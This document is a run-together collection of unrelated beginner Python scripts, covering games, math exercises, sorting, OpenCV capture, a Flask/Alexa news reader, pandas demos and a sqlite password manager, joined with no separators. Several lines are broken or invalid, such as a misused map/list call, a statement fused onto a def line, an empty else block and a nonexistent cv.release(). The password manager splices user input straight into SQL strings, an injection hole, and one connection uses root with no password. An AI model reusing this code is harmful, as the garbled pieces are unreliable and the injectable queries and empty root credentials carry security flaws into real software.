foo=5
foo="jalebi"
bar=foo
print("bar id",id(bar))
print("foo id",id(foo))
bar="samosa"
foo="kachodi" 
n=map(list(int,input().split()))
odd_list=list(i for i in n if i%2!=0)
print(odd_list)
exit()
n = int(input("Enter the limit : "))  
if n <= 0:
    print("Invalid number, please enter a number greater than zero!")
else:    
    odd_list = [i for i in range(1,n+1,2)]      
    print(odd_list)  
n=map(list(int,input().split()))
even=[]
odd=[]
for i in range (n):
    if i%2==0:
        even.append(i)
    else:
        odd.append(i)
import random
import time
choices = {'S':'Snake','W':'Water','G':'Gun'}
x = 0
com_win = 0
user_win = 0
match_draw = 0
print('Welcome to the Snake-Water-Gun Game\n')
print('I am Mr. Computer, We will play this game 10 times')
print('Whoever wins more matches will be the winner\n')
while x < 10:
    print(f'Game No. {x+1}')
    for key, value in choices.items():
        print(f'Choose {key} for {value}')
    com_choice = random.choice(list(choices.keys())).lower()
    user_choice = input('\n----->').lower()
    if user_choice == 's' and com_choice == 'w':
        com_win += 1
    elif user_choice == 's' and com_choice == 'g':
        com_win += 1
    elif user_choice == 'w' and com_choice == 's':
        user_win += 1
    elif user_choice == 'g' and com_choice == 's':
        user_win += 1
    elif user_choice == 'g' and com_choice == 'w':
        com_win += 1
    elif user_choice == 'w' and com_choice == 'g':
        user_win += 1
    elif user_choice == com_choice:
        match_draw += 1
    else:
        print('\n\nYou entered wrong !!!!!!')
        x = 0
        print('Restarting the game')
        print('')
        time.sleep(1)
        continue
    x += 1
    print('\n')
print('Here are final stats of the 10 matches : ')
print(f'Mr. Computer won : {com_win} matches')
print(f'You won : {user_win} matches')
print(f'Matches Drawn : {match_draw}')
if com_win > user_win:
    print('\n-------Mr. Computer won-------')
elif com_win < user_win:
    print('\n-----------You won-----------')
else:
    print('\n----------Match Draw----------')
def ex_expense_break():
    month_list = ["January", "February", "March", "April", "May"]
    expense_list = [2340, 2500, 2100, 3100, 2980]
    e = input("Enter expense amount: ")
    e = int(e)
    month = -1
    for i in range(len(expense_list)):
        if e == expense_list[i]:
            month = i
            break
    if month != -1:
        print('You spent',e,'in',month_list[month])
    else:
        print('You didn\'t spend',e,'in any month')
def ex_print_shape():
    for i in range(1,6):
        s = ''
        for j in range(i):
            s += '*'
        print(s)
def ex_heads_tails():
    result = ["heads","tails","tails","heads","tails","heads","heads","tails","tails","tails"]
    count = 0
    for item in result:
        if item == "heads":
            count += 1
    print("Heads count: ",count)
def demo_break_marathon():
    for i in range(1,11):
        if i % 2 == 0:
            continue
    print(i*i)
from __future__ import print_function
import os
import urllib.request
from selenium import webdriver
print("Testing Internet Connection")
try:
    urllib.request.urlopen("http://google.com", timeout=2)  
    print("Internet is working fine!")
    question = input("Do you want to open a website? (Y/N): ")
    if question == 'Y':
        search = input("Input website to open (http://website.com) : ")
    else:
        os._exit(0)
except urllib.error.URLError:
    print("No internet connection!")  
browser = webdriver.Firefox()
browser.get(search)
os.system('cls')  
print("[+] Website " + search + " opened!")
browser.close()
import math as m
def main():
    shape = int(input("Enter 1 for square, 2 for rectangle, 3 for circle, 4 for triangle, 5 for cylinder, 6 for cone, or 7 for sphere: "))
    if shape == 1:
      side = float(input("Enter length of side: "))
      print("Area of square = " + str(side**2))
    elif shape == 2:
      l = float(input("Enter length: "))
      b = float(input("Enter breadth: "))
      print("Area of rectangle = " + str(l*b))
    elif shape == 3:
      r = float(input("Enter radius: "))
      print("Area of circle = " + str(m.pi*r*r))
    elif shape == 4:
      base = float(input("Enter base: "))
      h = float(input("Enter height: "))
      print("Area of rectangle = " + str(0.5*base*h))
    elif shape == 5:
        r = float(input("Enter radius: "))
        h = float(input("Enter height: "))
        print("Area of cylinder = " + str(m.pow(r, 2)*h*m.pi))
    elif shape == 6:
        r = float(input("Enter radius: "))
        h = float(input("Enter height: "))
        print("Area of cone = " + str(m.pow(r, 2)*h*1/3*m.pi))
    elif shape == 7:
        r = float(input("Enter radius: "))
        print("Area of sphere = " + str(m.pow(r, 3)*4/3*m.pi))
    else:
      print("You have selected wrong choice.")
    restart = input("Would you like to calculate the area of another object? Y/N : ")
    if restart.lower().startswith("y"):
        main()
    elif restart.lower().startswith("n"):
        quit()
main()
def crc_check(data, div):
    l = len(div)
    ct = 0
    data = [int(i) for i in data]
    div = [int(i) for i in div]
    zero = [0 for i in range(l)]
    temp_data = [data[i] for i in range(l)]
    result = []
    for j in range(len(data) - len(div) + 1):
        print("Temp_dividend", temp_data)
        msb = temp_data[0]
        if msb == 0:
            result.append(0)
            for i in range(l - 1, -1, -1):
                temp_data[i] = temp_data[i] ^ zero[i]
        else:
            result.append(1)
            for i in range(l - 1, -1, -1):
                temp_data[i] = temp_data[i] ^ div[i]
        temp_data.pop(0)
        if (l + j < len(data)):
            temp_data.append(data[l + j])
    crc = temp_data
    print("Quotient: ", result, "remainder", crc)
    return crc
while 1 > 0:
    print("Enter data: ")
    data = input()  
    print("Enter divisor")
    div = input() 
    original_data = data
    data = data + ("0" * (len(div) - 1))
    crc = crc_check(data, div)
    crc_str = ""
    for c in crc:
        crc_str += c
    print("Sent data: ", original_data + crc_str)
    sent_data = original_data + crc_str
    print("If again applying CRC algorithm, the remainder/CRC must be zero if errorless.")
    crc = crc_check(sent_data, div)
    remainder = crc
    print("Receiver side remainder: ", remainder)
    print("Continue [Y/N]:")
    ch = input()
    if ch == 'N' or ch == 'n':
        break
    else:
        continue
def rotate(n):
    a = list(n)
    if len(a) == 0:
        return print ([])
    l = []
    for i in range(1,len(a)+1):
        a = [a[(i+1)%(len(a))] for i in range(0,len(a))]
        l += ["".join(a)]
    print(l)
string = str(input())
print("Your input is :" ,string)
print("The rotation is :")
rotate(string)
base=10.26
height=20.572
area=(1/2)*base*height
print("area is:",area) 
print("area rounded to 2 decimal place:",round(area,2)) 
print(1+2) 
print(1/2) 
print(17%3) 
print(3**2) 
print(10+2*3) 
print((10+2)*3) 
print(type(area)) 
foo=2.3e-3
print(foo) 
print(type(1)) 
print(0x12) 
print(type(0x12)) 
c1=2+3j
print(type(c1)) 
c2=3-4j
print(c1+c2) 
print(format(5,'b')) 
print(6-5.7) 
from appJar import gui
def press():
    print(p.getRadioButton('harf'))
p = gui()
p.setSize(300,200)
p.addRadioButton('harf', 'A')
p.addRadioButton('harf', 'B')
p.addRadioButton('harf', 'C')
p.addButton('Buton', press)
p.go()def foo():
    pass
def bar():
    pass
foo()
RUN = 32 
def insertionSort(arr, left, right):  
    for i in range(left + 1, right+1):  
        temp = arr[i]  
        j = i - 1 
        while j >= left and arr[j] > temp :  
            arr[j+1] = arr[j]  
            j -= 1
        arr[j+1] = temp  
def merge(arr, l, m, r): 
    len1, len2 =  m - l + 1, r - m  
    left, right = [], []  
    for i in range(0, len1):  
        left.append(arr[l + i])  
    for i in range(0, len2):  
        right.append(arr[m + 1 + i])  
    i, j, k = 0, 0, l 
    while i < len1 and j < len2:  
        if left[i] <= right[j]:  
            arr[k] = left[i]  
            i += 1 
        else: 
            arr[k] = right[j]  
            j += 1 
        k += 1
    while i < len1:  
        arr[k] = left[i]  
        k += 1 
        i += 1
    while j < len2:  
        arr[k] = right[j]  
        k += 1
        j += 1
def timSort(arr, n):  
    for i in range(0, n, RUN):  
        insertionSort(arr, i, min((i+31), (n-1)))  
    size = RUN 
    while size < n:  
        for left in range(0, n, 2*size):  
            mid = left + size - 1 
            right = min((left + 2*size - 1), (n-1))  
            merge(arr, left, mid, right)  
        size = 2*size 
def printArray(arr, n):  
    for i in range(0, n):  
        print(arr[i], end = " ")  
if __name__ == "__main__": 
    n = int(input('Enter size of array\n'))
    print('Enter elements of array\n')
    arr = list(map(int ,input().split()))  
    print("Given Array is")  
    printArray(arr, n)  
    timSort(arr, n)  
    print("After Sorting Array is")  
    printArray(arr, n)  
def last_digit(a, b):
    if b==0:   
        return 1
    elif a%10 in [0,5,6,1]:
        return a%10
    elif b%4==0:
        return ((a%10)**4)%10
    else:
        return ((a%10)**(b%4))%10
class Node: 
	def __init__(self, data): 
		self.data = data 
		self.next = None
class LinkedList: 
	def __init__(self): 
		self.head = None
	def printList(self): 
		temp = self.head 
		while temp : 
			print(temp.data, end="->") 
			temp = temp.next
	def append(self, new_data): 
		new_node = Node(new_data) 
		if self.head is None: 
			self.head = new_node 
			return
		last = self.head 
		while last.next: 
			last = last.next
		last.next = new_node 
def mergeLists(head1, head2): 
	temp = None
	if head1 is None: 
		return head2 
	if head2 is None: 
		return head1 
	if head1.data <= head2.data: 
		temp = head1 
		temp.next = mergeLists(head1.next, head2) 
	else: 
		temp = head2 
		temp.next = mergeLists(head1, head2.next) 
	return temp 
if __name__ == '__main__': 
	list1 = LinkedList() 
	list1.append(10) 
	list1.append(20) 
	list1.append(30) 
	list1.append(40) 
	list1.append(50) 
	list2 = LinkedList() 
	list2.append(5) 
	list2.append(15) 
	list2.append(18) 
	list2.append(35) 
	list2.append(60) 
	list3 = LinkedList() 
	list3.head = mergeLists(list1.head, list2.head) 
	print(" Merged Linked List is : ", end="") 
	list3.printList()		 
from fpdf import FPDF
pdf = FPDF()
pdf.set_author('@NavonilDas')
pdf.set_subject('python')
pdf.set_title('Generating PDF with Python')
pdf.add_page()
pdf.set_font("Courier", '', 18)
pdf.text(0, 50, "Example to generate PDF in python.")
pdf.set_font("Courier", 'i', 28)
pdf.text(0, 60, "This is an italic text")  
pdf.rect(10, 100, 60, 30, 'D')
pdf.set_fill_color(255, 0, 0)  
pdf.ellipse(10, 135, 50, 50, 'F')
pdf.output('output.pdf', 'F')
def calculate_area(base, height):
    print("__name__: ",__name__)
    return 1/2*(base*height)
if __name__ == "__main__":
    print("I am in area.py")
    a=calculate_area(10, 20)
    print("area: ",a)
import cv2
capture = cv2.VideoCapture(0)
fourcc = cv2.VideoWriter_fourcc(*'XVID')
output = cv2.VideoWriter('slowmotion.mp4', fourcc, 5, (640, 480))
while True:
    ret, frame = capture.read()
    output.write(frame)
    cv2.imshow('frame', frame)
    if cv2.waitKey(1) & 0xFF == ord('x'):
        break
capture.release()
output.release()
cv2.destroyAllWindows()
class Fibonacci:
    def __init__(self, limit):
        self.previous = 0
        self.current = 1
        self.n = 1
        self.limit = limit
    def __iter__(self):
        return self
    def __next__(self):
        if self.n < self.limit:
            result = self.previous + self.current
            self.previous = self.current
            self.current = result
            self.n += 1
            return result
        else:
            raise StopIteration
fib_iterator = iter(Fibonacci(5))
while True:
    try:
        print(next(fib_iterator))
    except StopIteration:
        break
sugar=input("Please enter your fasting sugar level:")
sugar=float(sugar)
if sugar<80:
    print("Your sugar is low, go eat some jalebi :)")
elif sugar>100:
    print("Your sugar is high, stop eating all mithais..!")
else:
    print("Your sugar is normal, relax and enjoy your life!")
import os  
logdir = os.getenv("logs")  
logfile = 'script_list.log'  
path = os.getenv("scripts")  
logfilename = os.path.join(logdir, logfile)  
log = open(logfilename, 'w')  
for dirpath, dirname, filenames in os.walk(path):  
    for filename in filenames:  
        log.write(os.path.join(dirpath, filename) + '\n')  
print("\nYour logfile ", logfilename, "has been created")  
import sys
import serial
def ListAvailablePorts():
    AvailablePorts = []
    platform = sys.platform
    if platform == 'win32':
        for i in range(255):
            try:
                ser = serial.Serial(i, 9600)
            except serial.serialutil.SerialException:
                pass
            else:
                AvailablePorts.append(ser.portstr)
                ser.close()
    elif platform == 'linux':
        for i in range(0, 255):
            try:
                ser = serial.Serial('/dev/ttyUSB' + str(i))
            except serial.serialutil.SerialException:
                pass
            else:
                AvailablePorts.append('/dev/ttyUSB' + str(i))
                ser.close()
    else:
    if len(AvailablePorts) == 0:
        print("NO port in use")
        return 0
    else:
        return AvailablePorts
import json
import time
import requests
import unidecode
from flask import Flask
from flask_ask import Ask, question, statement
app = Flask(__name__)
ask = Ask(app, "/reddit_reader")
def get_headlines():
    user_pass_dict = {'user': 'USERNAME', 'passwd': "PASSWORD", 'api_type': 'json'}
    sess = requests.Session()
    sess.headers.update({'User-Agent': 'I am testing Alexa: nobi'})
    sess.post("https://www.reddit.com/api/login/", data=user_pass_dict)
    time.sleep(1)
    url = "https://reddit.com/r/worldnews/.json?limit=10"
    html = sess.get(url)
    data = json.loads(html.content.decode("utf-8"))
    titles = [unidecode.unidecode(listing['data']['title']) for listing in data['data']['children']]
    titles = '... '.join([i for i in titles])
    return titles
def homepage():
    return "hi there!"
def start_skill():
    welcome_message = "Hello there, would you like to hear the news?"
    return question(welcome_message)
def share_headlines():
    headlines = get_headlines()
    headline_msg = "The current world news headlines are {}".format(headlines)
    return statement(headline_msg)
def no_intent():
    bye_text = "I am not sure why you then turned me on. Anyways, bye for now!"
    return statement(bye_text)
if __name__ == "__main__":
    app.run(port=8000, debug=True)
import mysql.connector
mydb = mysql.connector.connect(
    host="0.0.0.0",
    user="root",
    passwd="",
    database="db_name"
)
mycursor = mydb.cursor()
mycursor.execute("SELECT column FROM table")
myresult = mycursor.fetchall()
for x in myresult:
    print(x)
import time
def getFibonacciIterative(n: int) -> int:
    a = 0
    b = 1
    for _ in range(n):
        a, b = b, a + b
    return a
def getFibonacciRecursive(n: int) -> int:
    a = 0
    b = 1
    def step(n: int) -> int:
        nonlocal a, b
        if n <= 0:
            return a
        a, b = b, a + b
        return step(n - 1)
    return step(n)
def getFibonacciDynamic(n: int,fib: list) -> int:
    if n==0 or n==1:
        return n
    if fib[n]!=-1:
        return fib[n]
    fib[n]=getFibonacciDynamic(n-1,fib)+getFibonacciDynamic(n-2,fib)
    return fib[n]
def main():
    n=int(input())
    fib=[-1]*n
    getFibonacciDynamic(n,fib)
def compareFibonacciCalculators(n: int) -> None:
    startI = time.clock()
    resultI = getFibonacciIterative(n)
    endI = time.clock()
    startR = time.clock()
    resultR = getFibonacciRecursive(n)
    endR = time.clock()
    s = "{} calculting {} => {} in {} seconds"
    print(s.format(
        "Iteratively", n, resultI, endI - startI
    ))
    print(s.format(
        "Recursively", n, resultR, endR - startR
    ))
def main():
    print("This program illustrates a chaotic function")
    while True:
        try:
            x = float((input("Enter a number between 0 and 1: ")))
            if (0 < x and x < 1):
                break
            else:
                print("Please enter correct number")
        except Exception as e:
            print("Please enter correct number")
    for i in range(10):
        x = 3.9 * x * (1 - x)
        print(x)
if __name__ == '__main__':
    main()
from threading import Thread
from Background import Background
from PIL.Image import open as openImage
from PIL.ImageTk import PhotoImage
class Bird(Thread):
    __tag = "Bird"
    __isAlive = None
    __going_up = False
    __going_down = 0
    __times_skipped = 0
    __running = False
    decends = 0.00390625
    climbsUp = 0.0911458333
    def __init__(self, background, gameover_function, *screen_geometry, fp="bird.png", event="<Up>", descend_speed=5):
        if not isinstance(background, Background): raise TypeError(
            "The background argument must be an instance of Background.")
        if not callable(gameover_function): raise TypeError("The gameover_method argument must be a callable object.")
        self.__canvas = background
        self.image_path = fp
        self.__descend_speed = descend_speed
        self.gameover_method = gameover_function
        self.__width = screen_geometry[0]
        self.__height = screen_geometry[1]
        self.decends *= self.__height
        self.decends = int(self.decends + 0.5)
        self.climbsUp *= self.__height
        self.climbsUp = int(self.climbsUp + 0.5)
        Thread.__init__(self)
        self.width = (self.__width // 100) * 6
        self.height = (self.__height // 100) * 11
        self.__canvas.bird_image = \
        self.getPhotoImage(image_path=self.image_path, width=self.width, height=self.height, closeAfter=True)[0]
        self.__birdID = self.__canvas.create_image(self.__width // 2, self.__height // 2,
                                                   image=self.__canvas.bird_image, tag=self.__tag)
        self.__canvas.focus_force()
        self.__canvas.bind(event, self.jumps)
        self.__isAlive = True
    def birdIsAlive(self):
        return self.__isAlive
    def checkCollision(self):
        position = list(self.__canvas.bbox(self.__tag))
        if position[3] >= self.__height + 20:
            self.__isAlive = False
        if position[1] <= -20:
            self.__isAlive = False
        position[0] += int(25 / 78 * self.width)
        position[1] += int(25 / 77 * self.height)
        position[2] -= int(20 / 78 * self.width)
        position[3] -= int(10 / 77 * self.width)
        ignored_collisions = self.__canvas.getBackgroundID()
        ignored_collisions.append(self.__birdID)
        possible_collisions = list(self.__canvas.find_overlapping(*position))
        for _id in ignored_collisions:
            try:
                possible_collisions.remove(_id)
            except BaseException:
                continue
        if len(possible_collisions) >= 1:
            self.__isAlive = False
        return not self.__isAlive
    def getTag(self):
        return self.__tag
    def getPhotoImage(image=None, image_path=None, width=None, height=None, closeAfter=False):
        if not image:
            if not image_path: return
            image = openImage(image_path)
        if not width: width = image.width
        if not height: height = image.height
        newImage = image.resize([width, height])
        photoImage = PhotoImage(newImage)
        if closeAfter:
            newImage.close()
            newImage = None
            image.close()
            image = None
        return photoImage, newImage, image
    def jumps(self, event=None):
        self.checkCollision()
        if not self.__isAlive or not self.__running:
            self.__going_up = False
            return
        self.__going_up = True
        self.__going_down = 0
        if self.__times_skipped < self.climbsUp:
            self.__canvas.move(self.__tag, 0, -1)
            self.__times_skipped += 1
            self.__canvas.after(3, self.jumps)
        else:
            self.__going_up = False
            self.__times_skipped = 0
    def kill(self):
        self.__isAlive = False
    def run(self):
        self.__running = True
        self.checkCollision()
        if self.__going_down < self.decends:
            self.__going_down += 0.05
        if self.__isAlive:
            if not self.__going_up:
                self.__canvas.move(self.__tag, 0, self.__going_down)
            self.__canvas.after(self.__descend_speed, self.run)
        else:
            self.__running = False
            self.gameover_method()
from __future__ import print_function
import os
import stat  
import sys
import time
if sys.version_info >= (3, 0):
    raw_input = input
file_name = raw_input("Enter a file name: ")  
count = 0
t_char = 0
try:
    with open(file_name) as f:
        count = (sum(1 for line in f))
        f.seek(0)
        t_char = (sum([len(line) for line in f]))
except FileNotFoundError as e:
    sys.exit(1)
except IOError:
    pass
except IsADirectoryError:
    pass
file_stats = os.stat(file_name)
file_info = {
    'fname': file_name,
    'fsize': file_stats[stat.ST_SIZE],
    'f_lm': time.strftime("%d/%m/%Y %I:%M:%S %p",
                          time.localtime(file_stats[stat.ST_MTIME])),
    'f_la': time.strftime("%d/%m/%Y %I:%M:%S %p",
                          time.localtime(file_stats[stat.ST_ATIME])),
    'f_ct': time.strftime("%d/%m/%Y %I:%M:%S %p",
                          time.localtime(file_stats[stat.ST_CTIME])),
    'no_of_lines': count,
    't_char': t_char
}
file_info_keys = ('file name', 'file size', 'last modified', 'last accessed',
                  'creation time', 'Total number of lines are',
                  'Total number of characters are')
file_info_vales = (file_info['fname'], str(file_info['fsize']) + " bytes",
                   file_info['f_lm'], file_info['f_la'], file_info['f_ct'],
                   file_info['no_of_lines'], file_info['t_char'])
for f_key, f_value in zip(file_info_keys, file_info_vales):
    print(f_key, ' =', f_value)
if stat.S_ISDIR(file_stats[stat.ST_MODE]):
    print("This a directory.")
else:
    file_stats_fmt = ''
    print("\nThis is not a directory.")
    stats_keys = ("st_mode (protection bits)", "st_ino (inode number)",
                  "st_dev (device)", "st_nlink (number of hard links)",
                  "st_uid (user ID of owner)", "st_gid (group ID of owner)",
                  "st_size (file size bytes)",
                  "st_atime (last access time seconds since epoch)",
                  "st_mtime (last modification time)",
                  "st_ctime (time of creation Windows)")
    for s_key, s_value in zip(stats_keys, file_stats):
        print(s_key, ' =', s_value)
def factorial(n):
    if n == 0:
        return 1
    else:
        return n * factorial(n - 1)
n = int(input("Input a number to compute the factiorial : "))
print(factorial(n))
import sqlite3
from getpass import getpass
import os
ADMIN_PASSWORD = os.environ['ADMIN_PASS']
connect = getpass("What is your admin  password?\n")
while connect != ADMIN_PASSWORD:
    connect = getpass("What is your admin password?\n")
    if connect == "q":
        break
conn = sqlite3.connect('password_manager.db')
cursor_ = conn.cursor()
def get_password(service_):
    command = 'SELECT * from STORE WHERE SERVICE = "' + service_ + '"'
    cursor = conn.execute(command)
    for row in cursor:
        username_ = row[1]
        password_ = row[2]
    return [username_, password_]
def add_password(service_, username_, password_):
    command = 'INSERT INTO STORE (SERVICE,USERNAME,PASSWORD) VALUES("'+service_+'","'+username_+'","'+password_+'");'
    conn.execute(command)
    conn.commit()
def update_password(service_, password_):
    command = 'UPDATE STORE set PASSWORD = "' + password_ + '" where SERVICE = "' + service_ + '"'
    conn.execute(command)
    conn.commit()
    print(service_ + " password updated successfully.")
def delete_service(service_):
    command = 'DELETE from STORE where SERVICE = "' + service_ + '"'
    conn.execute(command)
    conn.commit()
    print(service_ + " deleted from the database successfully.")
def get_all():
    cursor_.execute("SELECT * from STORE")
    data = cursor_.fetchall()
    if len(data) == 0:
        print('No Data')
    else:
        for row in data:
            print("service = ", row[0])
            print("username = ", row[1])
            print("password = ", row[2])
def is_service_present(service_):
    cursor_.execute("SELECT SERVICE from STORE where SERVICE = ?", (service_,))
    data = cursor_.fetchall()
    if len(data) == 0:
        print('There is no service named %s' % service_)
        return False
    else:
        return True
if connect == ADMIN_PASSWORD:
    try:
        print("Your safe has been created!\nWhat would you like to store in it today?")
    except:
        print("You have a safe, what would you like to do today?")
    while True:
        print("\n" + "*" * 15)
        print("Commands:")
        print("quit = quit program")
        print("get = get username and password")
        print("getall = show all the details in the database")
        print("store = store username and password")
        print("update = update password")
        print("delete = delete a service details")
        print("*" * 15)
        input_ = input(":")
        if input_ == "quit":
            print("\nGoodbye, have a great day.\n")
            conn.close()
            break
        elif input_ == "store":
            service = input("What is the name of the service?\n")
            cursor_.execute("SELECT SERVICE from STORE where SERVICE = ?", (service,))
            data = cursor_.fetchall()
            if len(data) == 0:
                username = input("Enter username : ")
                password = getpass("Enter password : ")
                if username == '' or password == '':
                    print("Your username or password is empty.")
                else:
                    add_password(service, username, password)
                    print("\n" + service.capitalize() + " password stored\n")
            else:
                print("Service named {} already exists.".format(service))
        elif input_ == "get":
            service = input("What is the name of the service?\n")
            flag = is_service_present(service)
            if flag:
                username, password = get_password(service)
                print(service.capitalize() + " Details")
                print("Username : ", username)
                print("Password : ", password)
        elif input_ == "update":
            service = input("What is the name of the service?\n")
            if service == '':
                print('Service is not entered.')
            else:
                flag = is_service_present(service)
                if flag:
                    password = getpass("Enter new password : ")
                    update_password(service, password)
        elif input_ == "delete":
            service = input("What is the name of the service?\n")
            if service == '':
                print('Service is not entered.')
            else:
                flag = is_service_present(service)
                if flag:
                    delete_service(service)
        elif input_ == "getall":
            get_all()
        else:
            print("Invalid command.")
import pygame
import sys
from pygame.locals import *
pygame.init()
window = pygame.display.set_mode((400, 300), 0, 32)
pygame.display.set_caption("Shape")
WHITE = (255, 255, 255)
GREEN = (0, 255, 0)
window.fill(WHITE)
pygame.draw.polygon(window, GREEN, ((146, 0), (236, 277), (56, 277)))
while True:
    for event in pygame.event.get():
        if event.type == QUIT:
            pygame.quit()
            sys.exit()
    pygame.display.update()
import sys,webbrowser,pyperclip
if len(sys.argv)>1:
    address = ' '.join(sys.argv[1:])
elif len(pyperclip.paste())> 2:
    address = pyperclip.paste()
else:
    address = input("enter your palce")
webbrowser.open('https://www.google.com/maps/place/'+address)
num=int(input("enter any Number"))
rev =0
while num>0 :
    Rem = num% 10
    num = num//10
    rev=rev*10+Rem
print("The Reverse of the number",rev)
num = input()
print(int(num[::-1]))
def solution(n: int = 600851475143) -> int:
    try:
        n = int(n)
    except (TypeError, ValueError):
        raise TypeError("Parameter n must be int or passive of cast to int.")
    if n <= 0:
        raise ValueError("Parameter n must be greater or equal to one.")
    i = 2
    ans = 0
    if n == 2:
        return 2
    while n > 2:
        while n % i != 0:
            i += 1
        ans = i
        while n % i == 0:
            n = n / i
        i += 1
    return int(ans)
if __name__ == "__main__":
    import doctest
    doctest.testmod()
    print(solution(int(input().strip())))
import cv2 as cv
face_cascade = cv.CascadeClassifier("..\libs\haarcascade_frontalface_default.xml")
face_cascade_eye = cv.CascadeClassifier("..\libs\haarcascade_eye.xml")
cap = cv.VideoCapture(0)
while cap.isOpened():
    falg, img = cap.read()  
    gray = cv.cvtColor(
        img, cv.COLOR_BGR2GRAY
    )  
    faces = face_cascade.detectMultiScale(
        img, 1.1, 7
    )  
    eyes = face_cascade_eye.detectMultiScale(img, 1.1, 7)
    for (x, y, w, h) in faces:
        cv.rectangle(img, (x, y), (x + w, y + h), (0, 255, 0), 1)
    for (a, b, c, d) in eyes:
        cv.rectangle(img, (a, b), (a + c, b + d), (255, 0, 0), 1)
    cv.imshow("img", img)
    c = cv.waitKey(1)
    if c == ord("q"):
        break
cv.release()
cv.destroyAllWindows()
import os
import sys  
try:
    directory = sys.argv[1]  
except IndexError:
    sys.exit("Must provide an argument.")
dir_size = 0  
fsizedicr = {'Bytes': 1,
             'Kilobytes': float(1) / 1024,
             'Megabytes': float(1) / (1024 * 1024),
             'Gigabytes': float(1) / (1024 * 1024 * 1024)}
for (path, dirs, files) in os.walk(
        directory):  
    for file in files:  
        filename = os.path.join(path, file)
        dir_size += os.path.getsize(filename)  
fsizeList = [str(round(fsizedicr[key] * dir_size, 2)) + " " + key for key in fsizedicr]  
if dir_size == 0:
    print("File Empty")  
else:
    for units in sorted(fsizeList)[::-1]:  
        print("Folder Size: " + units)
import os
import cv2
def image_resize(image, width=None, height=None, inter=cv2.INTER_AREA):
    dim = None
    (h, w) = image.shape[:2]
    if width is None and height is None:
        return image
    if width is None:
        r = height / float(h)
        dim = (int(w * r), height)
    else:
        r = width / float(w)
        dim = (width, int(h * r))
    resized = cv2.resize(image, dim, interpolation=inter)
    return resized
class CFEVideoConf(object):
    STD_DIMENSIONS = {
        "360p": (480, 360),
        "480p": (640, 480),
        "720p": (1280, 720),
        "1080p": (1920, 1080),
        "4k": (3840, 2160),
    }
    VIDEO_TYPE = {
        'avi': cv2.VideoWriter_fourcc(*'XVID'),
        'mp4': cv2.VideoWriter_fourcc(*'XVID'),
    }
    width = 640
    height = 480
    dims = (640, 480)
    capture = None
    video_type = None
    def __init__(self, capture, filepath, res="480p", *args, **kwargs):
        self.capture = capture
        self.filepath = filepath
        self.width, self.height = self.get_dims(res=res)
        self.video_type = self.get_video_type()
    def change_res(self, width, height):
        self.capture.set(3, width)
        self.capture.set(4, height)
    def get_dims(self, res='480p'):
        width, height = self.STD_DIMENSIONS['480p']
        if res in self.STD_DIMENSIONS:
            width, height = self.STD_DIMENSIONS[res]
        self.change_res(width, height)
        self.dims = (width, height)
        return width, height
    def get_video_type(self):
        filename, ext = os.path.splitext(self.filepath)
        if ext in self.VIDEO_TYPE:
            return self.VIDEO_TYPE[ext]
        return self.VIDEO_TYPE['avi']
import numpy as np
import pandas as pd
from matplotlib import *
x1 = np.array([1, 2, 3, 4])
s = pd.Series(x1, index=[1, 2, 3, 4])
print(s)
x2 = np.array([1, 2, 3, 4, 5, 6])
s = pd.DataFrame(x2)
print(s)
x3 = np.array([['Alex', 10], ['Nishit', 21], ['Aman', 22]])
s = pd.DataFrame(x3, columns=['Name', 'Age'])
print(s)
data = {'Name': ['Tom', 'Jack', 'Steve', 'Ricky'], 'Age': [28, 34, 29, 42]}
df = pd.DataFrame(data, index=['rank1', 'rank2', 'rank3', 'rank4'])
print(df)
data = [{'a': 1, 'b': 2}, {'a': 3, 'b': 4, 'c': 5}]
df = pd.DataFrame(data)
print(df)
d = {'one': pd.Series([1, 2, 3], index=['a', 'b', 'c']),
     'two': pd.Series([1, 2, 3, 4], index=['a', 'b', 'c', 'd'])}
df = pd.DataFrame(d)
print(df)
data = {'one': pd.Series([1, 2, 3, 4], index=[1, 2, 3, 4]),
        'two': pd.Series([1, 2, 3], index=[1, 2, 3])}
df = pd.DataFrame(data)
print(df)
df['three'] = pd.Series([1, 2], index=[1, 2])
print(df)
data = {'one': pd.Series([1, 2, 3, 4], index=[1, 2, 3, 4]),
        'two': pd.Series([1, 2, 3], index=[1, 2, 3]),
        'three': pd.Series([1, 1], index=[1, 2])
        }
df = pd.DataFrame(data)
print(df)
del df['one']
print(df)
df.pop('two')
print(df)
data = {'one': pd.Series([1, 2, 3, 4], index=[1, 2, 3, 4]),
        'two': pd.Series([1, 2, 3], index=[1, 2, 3]),
        'three': pd.Series([1, 1], index=[1, 2])
        }
df = pd.DataFrame(data)
print(df.loc[2])
print(df[1:4])
df = pd.DataFrame([[1, 2], [3, 4]], columns=['a', 'b'])
df2 = pd.DataFrame([[5, 6], [7, 8]], columns=['a', 'b'])
df = df.append(df2)
print(df.head())
df = pd.DataFrame([[1, 2], [3, 4]], columns=['a', 'b'])
df2 = pd.DataFrame([[5, 6], [7, 8]], columns=['a', 'b'])
df = df.append(df2)
df = df.drop(0)
print(df)
d = {'Name': pd.Series(['Tom', 'James', 'Ricky', 'Vin', 'Steve', 'Smith', 'Jack']),
     'Age': pd.Series([25, 26, 25, 23, 30, 29, 23]),
     'Rating': pd.Series([4.23, 3.24, 3.98, 2.56, 3.20, 4.6, 3.8])}
df = pd.DataFrame(d)
print("The transpose of the data series is:")
print(df.T)
print(df.shape)
print(df.size)
print(df.values)
d = {'Name': pd.Series(['Tom', 'James', 'Ricky', 'Vin', 'Steve', 'Smith', 'Jack',
                        'Lee', 'David', 'Gasper', 'Betina', 'Andres']),
     'Age': pd.Series([25, 26, 25, 23, 30, 29, 23, 34, 40, 30, 51, 46]),
     'Rating': pd.Series([4.23, 3.24, 3.98, 2.56, 3.20, 4.6, 3.8, 3.78, 2.98, 4.80, 4.10, 3.65])
     }
df = pd.DataFrame(d)
print(df.sum())
d = {'Name': pd.Series(['Tom', 'James', 'Ricky', 'Vin', 'Steve', 'Smith', 'Jack',
                        'Lee', 'David', 'Gasper', 'Betina', 'Andres']),
     'Age': pd.Series([25, 26, 25, 23, 30, 29, 23, 34, 40, 30, 51, 46]),
     'Rating': pd.Series([4.23, 3.24, 3.98, 2.56, 3.20, 4.6, 3.8, 3.78, 2.98, 4.80, 4.10, 3.65])
     }
df = pd.DataFrame(d)
print(df.describe(include='all'))
unsorted_df = pd.DataFrame(np.random.randn(10, 2), index=[1, 4, 6, 2, 3, 5, 9, 8, 0, 7], columns=['col2', 'col1'])
sorted_df = unsorted_df.sort_index()
print(sorted_df)
sorted_df = unsorted_df.sort_index(ascending=False)
print(sorted_df)
